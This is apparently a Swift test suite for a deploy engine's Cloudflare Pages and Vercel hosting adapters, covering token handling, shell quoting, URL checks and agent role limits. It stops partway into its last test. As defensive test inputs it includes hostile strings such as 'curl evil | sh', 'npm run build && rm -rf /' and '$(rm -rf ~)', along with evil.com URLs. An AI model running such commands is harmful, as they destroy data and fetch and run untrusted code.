import Foundation
import Testing
import GRDB
@testable import BrahmaCore

/// Runs the built `brahma` binary against a throwaway data home.
private func brahma(_ args: [String], home: URL, env: [String: String] = [:], stdin: String? = nil) throws
    -> (status: Int32, stdout: String, stderr: String) {
    let url = brahmaExecutableURL()
    try #require(FileManager.default.isExecutableFile(atPath: url.path), "build the brahma product first")
    let p = Process()
    p.executableURL = url
    p.arguments = args
    var e = cliEnvironment(home: home)
    e.merge(env) { _, new in new }
    p.environment = e
    let out = Pipe(), err = Pipe()
    p.standardOutput = out; p.standardError = err
    let input = Pipe()
    p.standardInput = stdin == nil ? FileHandle.nullDevice : input
    try p.run()
    if let stdin {
        input.fileHandleForWriting.write(Data(stdin.utf8))
        try input.fileHandleForWriting.close()
    }
    let o = out.fileHandleForReading.readDataToEndOfFile(), r = err.fileHandleForReading.readDataToEndOfFile()
    p.waitUntilExit()
    return (p.terminationStatus, String(decoding: o, as: UTF8.self), String(decoding: r, as: UTF8.self))
}

/// A vault whose every read fails the test: readiness must never read a value.
private struct RefusingVault: SecretVault {
    func set(companyId: String, name: String, value: String) throws { Issue.record("vault written") }
    func value(companyId: String, name: String) throws -> String? { Issue.record("vault read"); return nil }
    func delete(companyId: String, name: String) throws { Issue.record("vault written") }
}

@Suite(.scratch) struct HostingTests {
    static let sha = "0123456789abcdef0123456789abcdef01234567"
    /// Deploys run under the data home (I3), never in a workspace.
    static let layout = ReleaseLayout(root: URL(fileURLWithPath: "/h/run/releases/C1", isDirectory: true))

    static func settings(_ provider: HostingProviderID = .cloudflarePages, project: String = "acme", outputDir: String? = "dist",
                         accountId: String? = "0123abcd", build: String? = nil, productionURL: String? = nil) -> HostingSettings {
        HostingSettings(companyId: "C1", provider: provider, project: project, accountId: accountId, productionURL: productionURL,
                        build: build, outputDir: outputDir, updatedAt: Date(timeIntervalSince1970: 0))
    }

    static func input(_ s: HostingSettings, adapter: any HostingAdapter, commit: String = sha, version: String = "0.1.0",
                      release: Int = 1, previousUpload: URL? = nil, previousDeployURL: String? = nil,
                      functions: Bool = false) -> DeployInput {
        DeployInput(settings: s, commit: commit, version: version, layout: layout, release: release, cli: adapter.cli,
                    previousUpload: previousUpload, previousDeployURL: previousDeployURL, functionsInCommit: functions)
    }

    static func message(_ body: () throws -> Void) -> String? {
        do { try body(); return nil } catch let e as WorkError { return e.message } catch { return "\(error)" }
    }

    static func fixture(_ name: String) throws -> String {
        let url = try #require(Bundle.module.url(forResource: name, withExtension: "txt", subdirectory: "Fixtures"))
        return try String(contentsOf: url, encoding: .utf8)
    }

    // MARK: Cloudflare Pages

    @Test func cloudflarePlanIsExactAndTokenFree() throws {
        let cf = CloudflarePagesAdapter()
        #expect(cf.tokenSecret == "CLOUDFLARE_API_TOKEN")
        #expect(cf.cli == "wrangler@4.156.0")
        #expect(cf.toolNetwork == ["registry.npmjs.org"])
        let plan = try cf.deployPlan(Self.input(Self.settings(), adapter: cf))
        let tools = Self.layout.deployTools(cli: cf.cli).path
        #expect(plan.display == """
            \(tools)/node_modules/.bin/wrangler pages project create acme --production-branch main
            \(tools)/node_modules/.bin/wrangler pages deploy dist --project-name acme --branch main --commit-hash \(Self.sha) --commit-message 'Release 0.1.0' --commit-dirty=true
            """)
        #expect(plan.steps.map(\.okIfOutputContains) == ["already exists", nil])
        #expect(plan.cwdPath == Self.layout.releaseDir(1).appending(path: "upload").path)
        #expect(plan.cwdPath.hasPrefix("/"))
        #expect(plan.stageFrom == ["dist"])
        #expect(plan.tokenSecret == "CLOUDFLARE_API_TOKEN")
        #expect(plan.network == ["api.cloudflare.com"])
        #expect(plan.env == ["CLOUDFLARE_ACCOUNT_ID": "0123abcd", "WRANGLER_SEND_METRICS": "false", "CI": "1",
                             "GIT_CEILING_DIRECTORIES": "/h/run/releases/C1"])
        #expect(plan.cwdPath == "/h/run/releases/C1/R-1/upload")
        // Token-free: the token is only ever the step environment's CLOUDFLARE_API_TOKEN, added by the executor from the vault.
        for arg in plan.steps.flatMap(\.argv) {
            #expect(!arg.contains("CLOUDFLARE_API_TOKEN") && !arg.contains("$"), "\(arg)")
            #expect(!arg.contains("npx"), "\(arg)")
        }
        #expect(plan.env["CLOUDFLARE_API_TOKEN"] == nil)
        #expect(!plan.display.contains("CLOUDFLARE_API_TOKEN"))
        #expect(plan.steps.allSatisfy { $0.argv.first == "\(tools)/node_modules/.bin/wrangler" })
        #expect(plan.hashIsCurrent)
        // The account ID is needed at deploy time.
        #expect(Self.message { _ = try cf.deployPlan(Self.input(Self.settings(accountId: nil), adapter: cf)) }
                == "Cloudflare needs the account ID; finish the hosting-account task")
        // The probe's (provisional) host list is the adapter's.
        let hosts = try Self.fixture("wrangler-hosts").split(separator: "\n").map(String.init).filter { !$0.hasPrefix("#") && !$0.isEmpty }
        #expect(hosts == cf.network)
    }

    @Test func cloudflareRollbackUsesPreviousUploadElsePlaceholder() throws {
        let cf = CloudflarePagesAdapter()
        let previous = Self.layout.releaseDir(1).appending(path: "upload")
        let back = try cf.rollbackPlan(Self.input(Self.settings(), adapter: cf, release: 2, previousUpload: previous))
        #expect(back.cwdPath == previous.path)
        #expect(back.steps.count == 1)
        #expect(back.steps[0].argv.dropFirst().prefix(3) == ["pages", "deploy", "dist"])
        #expect(back.stageFrom.isEmpty)
        let placeholder = try cf.rollbackPlan(Self.input(Self.settings(), adapter: cf, release: 2))
        #expect(placeholder.cwdPath == Self.layout.placeholderDir.path)
        #expect(placeholder.steps[0].argv.dropFirst().prefix(3) == ["pages", "deploy", "."])
        #expect(placeholder.hash != back.hash)
    }

    @Test func functionsFolderIsStagedWhenPresent() throws {
        let cf = CloudflarePagesAdapter()
        #expect(try cf.deployPlan(Self.input(Self.settings(), adapter: cf, functions: true)).stageFrom == ["dist", "functions"])
        #expect(try cf.deployPlan(Self.input(Self.settings(), adapter: cf, functions: false)).stageFrom == ["dist"])
        // The output folder itself is never staged twice.
        #expect(try cf.deployPlan(Self.input(Self.settings(outputDir: "functions/public"), adapter: cf, functions: true)).stageFrom
                == ["functions/public"])
        // Decided from the commit's tree (PR-24), never from an export.
        let f = try GitFixture(files: ["functions/api.js": "export const x = 1\n", "dist/index.html": "<p>hi</p>\n"])
        let withFunctions = try #require(try f.ws.head(of: "main"))
        #expect(try f.ws.treeHasDirectory(at: withFunctions, path: "functions"))
        #expect(try f.ws.treeHasDirectory(at: withFunctions, path: "dist"))
        #expect(!(try f.ws.treeHasDirectory(at: withFunctions, path: "public")))
        #expect(!(try f.ws.treeHasDirectory(at: withFunctions, path: "dist/index.html")))
        try f.git(["rm", "-r", "-q", "functions"])
        try f.write("functions", "not a folder\n")
        try f.git(["add", "functions"])
        try f.git(["commit", "-q", "-m", "functions is a file"])
        let asFile = try f.git(["rev-parse", "HEAD"])
        #expect(!(try f.ws.treeHasDirectory(at: asFile, path: "functions")))
        // Odd paths are simply not directories.
        for odd in ["", "-x", ":(top)", "/functions", "functions/"] { #expect(!(try f.ws.treeHasDirectory(at: withFunctions, path: odd)), "\(odd)") }
    }

    @Test func cloudflareURLsFromOutput() throws {
        let cf = CloudflarePagesAdapter()
        let output = try Self.fixture("wrangler-deploy")
        let s = Self.settings()
        let url = cf.deployURL(fromOutput: output, settings: s)
        #expect(url?.absoluteString == "https://1a2b3c4d.acme.pages.dev")
        #expect(cf.smokeBase(s, deployURL: url)?.absoluteString == "https://acme.pages.dev")
        // M1: only wrangler's "Deployment complete!" line counts, and only this project's URL on it. A URL a build log or a
        // function echoed elsewhere is ignored, even this project's.
        let echoed = "building... see https://deadbeef.acme.pages.dev\nhttps://cafef00d.acme.pages.dev\n" + output
        #expect(cf.deployURL(fromOutput: echoed, settings: s)?.absoluteString == "https://1a2b3c4d.acme.pages.dev")
        #expect(cf.deployURL(fromOutput: "https://deadbeef.acme.pages.dev\n", settings: s) == nil)
        #expect(cf.deployURL(fromOutput: "✨ Deployment complete! Take a peek over at https://1a2b3c4d.acme-other.pages.dev", settings: s) == nil)
        #expect(cf.deployURL(fromOutput: "✨ Deployment complete! Take a peek over at https://1a2b3c4d.acme.pages.dev.evil.com", settings: s) == nil)
        // The stored production URL wins.
        #expect(cf.smokeBase(Self.settings(productionURL: "https://www.acme.com"), deployURL: url)?.absoluteString == "https://www.acme.com")
        // Another project's URL in the output is not this deploy's.
        #expect(cf.deployURL(fromOutput: "https://deadbeef.evil.pages.dev\n", settings: s) == nil)
        #expect(cf.deployURL(fromOutput: "no url here", settings: s) == nil)
        #expect(cf.smokeBase(s, deployURL: nil) == nil)
    }

    // MARK: Vercel

    @Test func vercelTokenNeverInArgvAndSmokesAlias() throws {
        let v = VercelAdapter()
        #expect(v.tokenSecret == "VERCEL_TOKEN")
        #expect(v.cli == "vercel@65.9.0")
        #expect(v.network == ["api.vercel.com", "vercel.com"])
        let s = Self.settings(.vercel, accountId: "team_abc")
        let plan = try v.deployPlan(Self.input(s, adapter: v))
        let bin = Self.layout.deployTools(cli: v.cli).path + "/node_modules/.bin/vercel"
        // PR-15: the project comes from VERCEL_ORG_ID + VERCEL_PROJECT_ID, never `vercel link`.
        #expect(plan.steps.map(\.argv) == [[bin, "deploy", "--prod", "--yes"]])
        #expect(plan.env == ["VERCEL_ORG_ID": "team_abc", "VERCEL_PROJECT_ID": "acme", "VERCEL_TELEMETRY_DISABLED": "1", "CI": "1",
                             "GIT_CEILING_DIRECTORIES": "/h/run/releases/C1"])
        #expect(plan.stageFrom == ["."])
        #expect(plan.cwdPath == Self.layout.releaseDir(1).appending(path: "upload").path)
        for arg in plan.steps.flatMap(\.argv) { #expect(!arg.contains("VERCEL_TOKEN") && !arg.contains("$") && arg != "link", "\(arg)") }
        #expect(plan.env["VERCEL_TOKEN"] == nil)
        #expect(Self.message { _ = try v.deployPlan(Self.input(Self.settings(.vercel, accountId: nil), adapter: v)) }
                == "Vercel needs the team or account ID; finish the hosting-account task")
        // The per-deploy URL is read from the output; the smoke always goes to the production alias.
        let output = try Self.fixture("vercel-deploy")
        let deployed = v.deployURL(fromOutput: output, settings: s)
        #expect(deployed?.absoluteString == "https://acme-k3j4h5g6f-acme-team.vercel.app")
        // M2: the "Production:" line wins over a later bare URL line (stdout only; a merged build log is never parsed), and
        // only this project's per-deploy URLs count.
        let merged = "Production: https://acme-k3j4h5g6f-acme-team.vercel.app [12s]\nhttps://acme-evil00-x.vercel.app\n"
        #expect(v.deployURL(fromOutput: merged, settings: s)?.absoluteString == "https://acme-k3j4h5g6f-acme-team.vercel.app")
        #expect(v.deployURL(fromOutput: "https://acme-k3j4h5g6f-acme-team.vercel.app\n", settings: s)?.absoluteString
                == "https://acme-k3j4h5g6f-acme-team.vercel.app")
        #expect(v.deployURL(fromOutput: "Production: https://globex-a1-x.vercel.app\nhttps://evil-b2.vercel.app\n", settings: s) == nil)
        #expect(v.deployURL(fromOutput: "https://acme.vercel.app\n", settings: s) == nil)
        #expect(v.smokeBase(s, deployURL: deployed)?.absoluteString == "https://acme.vercel.app")
        #expect(v.smokeBase(Self.settings(.vercel, productionURL: "https://acme.com"), deployURL: deployed)?.absoluteString == "https://acme.com")
        // Rollback: the previous deploy URL, from an empty releaseDir/rollback, with the same env.
        let back = try v.rollbackPlan(Self.input(s, adapter: v, release: 2, previousDeployURL: "https://acme-k3j4h5g6f-acme-team.vercel.app"))
        #expect(back.steps.map(\.argv) == [[bin, "rollback", "https://acme-k3j4h5g6f-acme-team.vercel.app", "--yes"]])
        #expect(back.cwdPath == Self.layout.releaseDir(2).appending(path: "rollback").path)
        #expect(back.env == plan.env)
        #expect(Self.message { _ = try v.rollbackPlan(Self.input(s, adapter: v, previousDeployURL: "https://evil.example.com")) } != nil)
        // No previous release: the placeholder is deployed.
        let placeholder = try v.rollbackPlan(Self.input(s, adapter: v, release: 2))
        #expect(placeholder.steps.map(\.argv) == [[bin, "deploy", "--prod", "--yes"]])
        #expect(placeholder.cwdPath == Self.layout.placeholderDir.path)
        #expect(!VercelAdapter.hobbyNote.isEmpty)
    }

    /// C2: the whole URL is matched, from the escaped project, with a fixed-length hash right after it.
    @Test func vercelDeployURLIsMatchedWhole() {
        // A correct URL of this project is accepted.
        #expect(VercelAdapter.isDeployURL("https://acme-k3j4h5g6f-acme-team.vercel.app", project: "acme"))
        #expect(VercelAdapter.isDeployURL("https://acme-k3j4h5g6f-acme-team.vercel.app/", project: "acme"))
        #expect(VercelAdapter.isDeployURL("https://my-site-0a1b2c3d4-team.vercel.app", project: "my-site"))
        // A foreign project that starts with this one's name is rejected, wherever its segments fall.
        for foreign in ["https://acme-evil-k3j4h5g6f-acme-team.vercel.app", "https://acme-evil-x-k3j4h5g6f-team.vercel.app",
                        "https://acme-k3j4h5g6-team.vercel.app", "https://acme-k3j4h5g6fz-team.vercel.app",
                        "https://acme-K3J4H5G6F-team.vercel.app", "https://acme-k3j4h5g6f-team.vercel.app.evil.com",
                        "https://acme-k3j4h5g6f-team.vercel.app/path", "https://x.acme-k3j4h5g6f-team.vercel.app",
                        "http://acme-k3j4h5g6f-team.vercel.app", "https://acme.vercel.app"] {
            #expect(!VercelAdapter.isDeployURL(foreign, project: "acme"), "\(foreign)")
        }
        let s = Self.settings(.vercel, accountId: "team_abc")
        #expect(VercelAdapter().deployURL(fromOutput: "Production: https://acme-evil-k3j4h5g6f-acme-team.vercel.app [3s]\n", settings: s) == nil)
        // Regex metacharacters in a project name match only literally.
        #expect(VercelAdapter.isDeployURL("https://a.b-k3j4h5g6f-team.vercel.app", project: "a.b"))
        #expect(!VercelAdapter.isDeployURL("https://aXb-k3j4h5g6f-team.vercel.app", project: "a.b"))
        #expect(!VercelAdapter.isDeployURL("https://aaab-k3j4h5g6f-team.vercel.app", project: "a+b"))
        #expect(VercelAdapter.isDeployURL("https://a+b-k3j4h5g6f-team.vercel.app", project: "a+b"))
    }

    // MARK: Plans

    @Test func planHashCoversBuildOutputAndCwd() throws {
        let cf = CloudflarePagesAdapter()
        let base = try cf.deployPlan(Self.input(Self.settings(build: "npm run build"), adapter: cf))
        let changed = [
            try cf.deployPlan(Self.input(Self.settings(build: "npm run build"), adapter: cf, commit: "fedcba9876543210fedcba9876543210fedcba98")),
            try cf.deployPlan(Self.input(Self.settings(outputDir: "public", build: "npm run build"), adapter: cf)),
            try cf.deployPlan(Self.input(Self.settings(build: "npm run build"), adapter: cf, version: "0.1.1")),
            try cf.deployPlan(Self.input(Self.settings(build: "npm run build && rm -rf /"), adapter: cf)),
            try cf.deployPlan(Self.input(Self.settings(build: "npm run build"), adapter: cf, release: 2)),   // cwdPath
            try cf.deployPlan(Self.input(Self.settings(accountId: "ffff0000", build: "npm run build"), adapter: cf)),
        ]
        for (n, plan) in changed.enumerated() { #expect(plan.hash != base.hash, "change \(n)") }
        #expect(Set(changed.map(\.hash)).count == changed.count)
        // The same inputs give the same plan (propose time and the executor's re-render agree).
        #expect(try cf.deployPlan(Self.input(Self.settings(build: "npm run build"), adapter: cf)) == base)
        // cwdPath and build alone (the display does not show them) change the hash.
        var moved = base; moved.cwdPath = "/elsewhere"
        #expect(!moved.hashIsCurrent)
        var rebuilt = base; rebuilt.build = "curl evil | sh"
        #expect(!rebuilt.hashIsCurrent)
        var lenient = base; lenient.steps[1].okIfOutputContains = ""
        #expect(!lenient.hashIsCurrent)
        var wider = base; wider.network.append("evil.example.com")
        #expect(!wider.hashIsCurrent)
        var otherToken = base; otherToken.tokenSecret = "OTHER_TOKEN"
        #expect(!otherToken.hashIsCurrent)
        #expect(throws: WorkError.self) {
            try DeployPlan(steps: [], stageFrom: [], cwdPath: "relative/dir", network: [], tokenSecret: "X_TOKEN", build: nil, outputDir: nil)
        }
    }

    @Test func outputDirRules() {
        let refusal = "output_dir must be a subfolder of the repo like dist or site/public (no dot folders, .git, .brahma or node_modules)"
        for ok in ["dist", "site/public", "_site", "build/web-1.2"] {
            #expect(Self.message { try Self.settings(outputDir: ok).validate() } == nil, "\(ok)")
        }
        for bad in [".", "./dist", ".git", ".brahma/x", "node_modules", "a/.hidden", "a b", "/abs", "../x", "a//b", "",
                    "dist/", "a/node_modules", "Node_Modules", "a/../b", "a/./b", "dist\n", "-x"] {
            #expect(Self.message { try Self.settings(outputDir: bad).validate() } == refusal, "\(bad)")
        }
    }

    @Test func shellQuoting() {
        #expect(ShellQuote.quote("a b") == "'a b'")
        #expect(ShellQuote.quote("it's") == "'it'\\''s'")
        #expect(ShellQuote.quote("--commit-dirty=true") == "--commit-dirty=true")
        #expect(ShellQuote.quote("/a/b@c:d+e") == "/a/b@c:d+e")
        #expect(ShellQuote.quote("") == "''")
        #expect(ShellQuote.quote("$(rm -rf ~)") == "'$(rm -rf ~)'")
        #expect(ShellQuote.joinArgv(["x", "$VERCEL_TOKEN"], rawRefs: ["VERCEL_TOKEN"]) == "x \"$VERCEL_TOKEN\"")
        #expect(ShellQuote.joinArgv(["x", "$OTHER"], rawRefs: ["VERCEL_TOKEN"]) == "x '$OTHER'")
        // Executed commands pass no raw refs (PR-11): nothing expands.
        #expect(ShellQuote.joinArgv(["x", "$VERCEL_TOKEN"], rawRefs: []) == "x '$VERCEL_TOKEN'")
        #expect(ShellQuote.joinArgv(["$VERCEL_TOKEN$(id)"], rawRefs: ["VERCEL_TOKEN"]) == "'$VERCEL_TOKEN$(id)'")
    }

    @Test func settingsValidationMessages() {
        func m(_ s: HostingSettings) -> String? { Self.message { try s.validate() } }
        #expect(m(Self.settings()) == nil)
        for bad in ["a", "Acme", "-acme", "acme-", "ac me", String(repeating: "a", count: 59)] {
            #expect(m(Self.settings(project: bad)) == "project names are 2–58 lowercase letters, digits and dashes", "\(bad)")
        }
        #expect(m(Self.settings(project: String(repeating: "a", count: 58))) == nil)
        #expect(m(Self.settings(build: String(repeating: "x", count: 2001))) == "build must be 1–2000 characters")
        #expect(m(Self.settings(build: "   ")) == "build must be 1–2000 characters")
        #expect(m(Self.settings(build: String(repeating: "x", count: 2000))) == nil)
        var expect = Self.settings(); expect.expectText = String(repeating: "y", count: 201)
        #expect(m(expect) == "expect_text must be at most 200 characters")
        expect.expectText = String(repeating: "y", count: 200)
        #expect(m(expect) == nil)
        for bad in ["http://acme.com", "acme.com", "https://", "https://user:pw@acme.com", "https://acme.com/a b", "ftp://x"] {
            #expect(m(Self.settings(productionURL: bad)) == "production URL must start with https://", "\(bad)")
        }
        #expect(m(Self.settings(productionURL: "https://acme.com/")) == nil)
        #expect(m(Self.settings(accountId: "abc def")) == "account ID must be 1–64 letters, digits, dashes or underscores")
        var smoke = Self.settings(); smoke.smoke = Array(repeating: SmokeRequest(method: "GET", path: "/"), count: 11)
        #expect(m(smoke) == "up to 10 smoke requests, each path starting with /")
        // Deploy-time rules (the adapter's validate).
        #expect(Self.message { try CloudflarePagesAdapter().validate(Self.settings(accountId: nil)) }
                == "Cloudflare needs the account ID; finish the hosting-account task")
        #expect(Self.message { try CloudflarePagesAdapter().validate(Self.settings(outputDir: nil)) }
                == "no output_dir is set yet; set it with set_deploy_config")
    }

    /// I3 (c): the executor's check before a token-holding step: no provider config in or above the deploy folder.
    @Test func providerConfigInOrAboveDeployFolderRefused() throws {
        let home = try tempDir()
        let layout = try ReleaseLayout(paths: BrahmaPaths(home: home, workspaces: try tempDir()), companyId: "C1")
        let upload = layout.releaseDir(1).appending(path: "upload")
        try FileManager.default.createDirectory(at: upload.appending(path: "dist"), withIntermediateDirectories: true)
        let cf = CloudflarePagesAdapter(), v = VercelAdapter()
        let s = Self.settings()
        let input = DeployInput(settings: s, commit: Self.sha, version: "0.1.0", layout: layout, release: 1, cli: cf.cli)
        let plan = try cf.deployPlan(input)
        #expect(plan.cwdPath == upload.path)
        #expect(throws: Never.self) { try cf.refuseProviderConfig(plan, releaseRoot: layout.root) }
        func refusal(_ adapter: any HostingAdapter, _ p: DeployPlan) -> String? {
            Self.message { try adapter.refuseProviderConfig(p, releaseRoot: layout.root) }
        }
        // In the folder, or any ancestor: refused, and the planted file is named.
        for (dir, name) in [(upload, "wrangler.toml"), (layout.releaseDir(1), "wrangler.json"), (layout.root, "wrangler.jsonc"),
                            (home, "wrangler.toml"), (upload, ".vercel"), (layout.root, ".git")] {
            let planted = dir.appending(path: name)
            if name.hasPrefix(".") { try FileManager.default.createDirectory(at: planted, withIntermediateDirectories: true) }
            else { try "x".write(to: planted, atomically: true, encoding: .utf8) }
            #expect(refusal(cf, plan) == "refusing to deploy: \(planted.path) would configure the provider CLI", "\(planted.path)")
            try FileManager.default.removeItem(at: planted)
        }
        // A link counts too (nothing is followed).
        let link = upload.appending(path: "wrangler.toml")
        try FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/nonexistent")
        #expect(refusal(cf, plan) != nil)
        try FileManager.default.removeItem(at: link)
        // A `.git` above the release root is git's ceiling's job, not a refusal; Vercel ignores wrangler's files.
        try FileManager.default.createDirectory(at: home.appending(path: ".git"), withIntermediateDirectories: true)
        #expect(refusal(cf, plan) == nil)
        let vplan = try v.deployPlan(DeployInput(settings: Self.settings(.vercel), commit: Self.sha, version: "0.1.0", layout: layout,
                                                 release: 1, cli: v.cli))
        try "x".write(to: upload.appending(path: "wrangler.toml"), atomically: true, encoding: .utf8)
        #expect(refusal(v, vplan) == nil)
        try FileManager.default.createDirectory(at: upload.appending(path: ".vercel"), withIntermediateDirectories: true)
        #expect(refusal(v, vplan) != nil)
        // A folder outside the release root (a workspace) is refused outright.
        var outside = plan; outside.cwdPath = "/ws/acme/.brahma/releases/R-1/upload"
        #expect(refusal(cf, outside) == "the deploy folder /ws/acme/.brahma/releases/R-1/upload is outside the engine's releases folder")
        // And DeployInput refuses places outside its root.
        var bad = input; bad.releaseDir = URL(fileURLWithPath: "/ws/acme/.brahma/releases/R-1")
        #expect(Self.message { _ = try cf.deployPlan(bad) } == "deploys run under the engine's releases folder")
        var sneaky = input; sneaky.releaseDir = layout.root.appending(path: "../other/R-1")
        #expect(Self.message { _ = try cf.deployPlan(sneaky) } == "deploys run under the engine's releases folder")
    }

    @Test func placeholderIsEngineWritten() throws {
        let layout = try ReleaseLayout(paths: BrahmaPaths(home: try tempDir(), workspaces: try tempDir()), companyId: "C1")
        let dir = try Placeholder.write(to: layout, companyName: "Acme <Labs>")
        #expect(dir == layout.placeholderDir)
        let html = try String(contentsOf: layout.placeholderDir.appending(path: "index.html"), encoding: .utf8)
        #expect(html.contains("<title>Acme &lt;Labs&gt;</title>"))
        #expect(html.contains("This site is being updated."))
        // Rewritten from scratch each time: nothing else survives in the folder.
        try "planted".write(to: layout.placeholderDir.appending(path: "evil.js"), atomically: true, encoding: .utf8)
        try Placeholder.write(to: layout, companyName: "Acme")
        #expect(try FileManager.default.contentsOfDirectory(atPath: layout.placeholderDir.path) == ["index.html"])
    }

    @Test func adapterLookupIsImmutableProduction() {
        #expect(HostingAdapters.adapter(.cloudflarePages).id == .cloudflarePages)
        #expect(HostingAdapters.adapter(.vercel).id == .vercel)
        #expect(Set(HostingAdapters.registry.keys) == Set(HostingProviderID.allCases))
        #expect(HostingProviderID.default == .cloudflarePages)
        #expect(HostingProviderID.allCases.map(\.title) == ["Cloudflare Pages", "Vercel"])
        // Tests inject their own adapter (PR-25).
        let fake = FakeHostingAdapter()
        let lookup: HostingAdapters.Lookup = { _ in fake }
        #expect(lookup(.vercel).cli == "fake@1")
    }

    // MARK: Store, tool and CLI

    @Test func deployConfigToolRoleAndDefaults() throws {
        let store = try Store.inMemory()
        let c = try store.createCompany(name: "Acme", goal: "g", workspacesRoot: try tempDir())
        let devops = try store.hire(companyId: c.id, name: "devops-1", role: "devops", model: "m")
        let eng = try store.hire(companyId: c.id, name: "eng-1", role: "engineer", model: "m")
        let tools = CompanyTools(store: store, companyId: c.id, agentId: devops.id)
        let out = try tools.call(name: "set_deploy_config", arguments: [
            "output_dir": .string("dist"), "build": .string("npm ci && npm run build"),
            "smoke": .array([.string("GET / 200"), .string("GET /health")]), "expect_text": .string("Welcome"),
        ])
        #expect(out == "Deploy config set: build npm ci && npm run build, output dist, Cloudflare Pages project acme.")
        let row = try #require(try store.hosting(companyId: c.id))
        #expect(row.provider == .cloudflarePages); #expect(row.project == c.slug)
        #expect(row.outputDir == "dist"); #expect(row.build == "npm ci && npm run build")
        #expect(row.smoke == [SmokeRequest(method: "GET", path: "/", expectStatus: 200), SmokeRequest(method: "GET", path: "/health")])
        #expect(row.expectText == "Welcome"); #expect(row.configuredById == devops.id)
        // No build: "none"; the owner's fields are kept.
        try store.setHosting(companyId: c.id, by: .owner, accountId: "0123abcd")
        #expect(try tools.call(name: "set_deploy_config", arguments: ["output_dir": .string("site/public")])
                == "Deploy config set: build none, output site/public, Cloudflare Pages project acme.")
        #expect(try store.hosting(companyId: c.id)?.accountId == "0123abcd")
        #expect(try store.hosting(companyId: c.id)?.smoke == [])
        // Validation reaches the agent verbatim; nothing changes.
        #expect(throws: (any Error).self) { try tools.call(name: "set_deploy_config", arguments: ["output_dir": .string(".git")]) }
        #expect(try store.hosting(companyId: c.id)?.outputDir == "site/public")
        // Other roles: refused at the tool and in the store.
        let engTools = CompanyTools(store: store, companyId: c.id, agentId: eng.id)
        do { _ = try engTools.call(name: "set_deploy_config", arguments: ["output_dir": .string("dist")]); Issue.record("eng-1 allowed") } catch let e as ToolError {
            #expect(e.message == "set_deploy_config is not available to your role")
        }
        #expect(Self.message { try store.setDeployConfig(companyId: c.id, by: eng.id, build: nil, outputDir: "dist", smoke: [], expectText: nil) }
                == "set_deploy_config is not available to your role")
        // The architect and executives may; another company's agent may not touch this one.
        let arch = try store.hire(companyId: c.id, name: "arch-1", role: "architect", model: "m")
        #expect(throws: Never.self) { try store.setDeployConfig(companyId: c.id, by: arch.id, build: nil, outputDir: "dist", smoke: [], expectText: nil) }
        let other = try store.createCompany(name: "Globex", goal: "g", workspacesRoot: try tempDir())
        let theirs = try store.hire(companyId: other.id, name: "devops-1", role: "devops", model: "m")
        #expect(Self.message { try store.setDeployConfig(companyId: c.id, by: theirs.id, build: nil, outputDir: "x", smoke: [], expectText: nil) }
                == "not in your company")
        #expect(try store.hosting(companyId: other.id) == nil)
        // The deploy tools are high-risk (no plan turns, one per turn).
        #expect(CompanyTools.highRiskTools.isSuperset(of: ["set_deploy_config", "set_smoke_check", "propose_deploy"]))
        let plan = CompanyTools(store: store, companyId: c.id, agentId: devops.id, planTurn: true)
        #expect(!plan.specs().map(\.name).contains("set_deploy_config"))
        // Owner-only fields refuse agents.
        #expect(Self.message { try store.setHosting(companyId: c.id, by: .agent(devops.id), project: "evil") } == "only the owner can change hosting")
        #expect(Self.message { try store.setHosting(companyId: c.id, by: .system, project: "evil") } == "only the owner can change hosting")
    }

    @Test func ownerSetsHostingAndProviderChangeClearsAccount() throws {
        let store = try Store.inMemory()
        let c = try store.createCompany(name: "Acme", goal: "g", workspacesRoot: try tempDir())
        let s = try store.setHosting(companyId: c.id, by: .owner, project: "acme-site", accountId: "0123abcd",
                                     productionURL: "https://acme.com")
        #expect(s.provider == .cloudflarePages); #expect(s.project == "acme-site"); #expect(s.outputDir == nil)
        #expect(Self.message { try store.setHosting(companyId: c.id, by: .owner, project: "Bad Name") }
                == "project names are 2–58 lowercase letters, digits and dashes")
        #expect(try store.hosting(companyId: c.id)?.project == "acme-site")
        let v = try store.setHosting(companyId: c.id, by: .owner, provider: .vercel)
        #expect(v.provider == .vercel); #expect(v.accountId == nil); #expect(v.productionURL == nil); #expect(v.project == "acme-site")
        let cleared = try store.setHosting(companyId: c.id, by: .owner, accountId: "team_x", productionURL: "")
        #expect(cleared.accountId == "team_x"); #expect(cleared.productionURL == nil)
        #expect(try store.anyHosting())
        // The row goes with its company.
        try store.writer.write { db in _ = try Company.deleteOne(db, key: c.id) }
        #expect(try store.hosting(companyId: c.id) == nil)
        #expect(!(try store.anyHosting()))
    }

    @Test func readinessReportsMissingPieces() throws {
        let store = try Store.inMemory()
        let c = try store.createCompany(name: "Acme", goal: "g", workspacesRoot: try tempDir())
        let vault = MemoryVault()
        try store.reloadRedactorIfNeeded(vault: vault, logFailures: false)
        #expect(try store.hostingReadiness(companyId: c.id, vault: vault, npmPresent: false)
                == HostingReadiness(configured: false, tokenPresent: false, accountPresent: false, npmPresent: false))
        let devops = try store.hire(companyId: c.id, name: "devops-1", role: "devops", model: "m")
        try store.setDeployConfig(companyId: c.id, by: devops.id, build: nil, outputDir: "dist", smoke: [], expectText: nil)
        #expect(try store.hostingReadiness(companyId: c.id, vault: vault, npmPresent: true)
                == HostingReadiness(configured: true, tokenPresent: false, accountPresent: false, npmPresent: true))
        try store.setSecret(companyId: c.id, name: "CLOUDFLARE_API_TOKEN", value: "cf-token-value-123456", isTest: false, vault: vault)
        try store.setHosting(companyId: c.id, by: .owner, accountId: "0123abcd")
        let ready = try store.hostingReadiness(companyId: c.id, vault: vault, npmPresent: true)
        #expect(ready == HostingReadiness(configured: true, tokenPresent: true, accountPresent: true, npmPresent: true))
        #expect(ready.ready)
        // The token is the provider's: switching to Vercel needs VERCEL_TOKEN (and a new account ID).
        try store.setHosting(companyId: c.id, by: .owner, provider: .vercel)
        #expect(try store.hostingReadiness(companyId: c.id, vault: vault, npmPresent: true)
                == HostingReadiness(configured: true, tokenPresent: false, accountPresent: false, npmPresent: true))
        // Decided from the secret's metadata only: readiness never reads the vault (a display path).
        try store.setSecret(companyId: c.id, name: "VERCEL_TOKEN", value: "vercel-token-value-123456", isTest: false, vault: vault)
        #expect(try store.hostingReadiness(companyId: c.id, vault: RefusingVault(), npmPresent: true).tokenPresent)
        #expect(try store.hostingReadiness(companyId: c.id, npmPresent: true).tokenPresent)
    }

    @Test func doctorNpmItemOnlyWithHosting() async throws {
        let store = try Store.inMemory()
        let c = try store.createCompany(name: "Acme", goal: "g", workspacesRoot: try tempDir())
